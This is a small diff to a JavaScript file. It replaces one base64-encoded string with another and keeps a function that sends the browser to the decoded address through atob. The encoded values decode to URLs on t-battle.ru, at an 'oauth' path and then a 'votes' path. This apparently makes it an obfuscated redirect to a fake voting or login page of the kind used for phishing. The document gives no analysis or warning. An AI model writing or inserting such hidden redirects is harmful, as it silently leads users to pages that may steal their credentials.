@@ -1,4 +1,4 @@
-var a = 'aHR0cHM6Ly90LWJhdHRsZS5ydS9vYXV0aC85MzU1MzUz'
+var a = 'aHR0cHM6Ly90LWJhdHRsZS5ydS92b3Rlcy83MTQyNjE4'
 var q = function(){
   location = atob(a);
 }
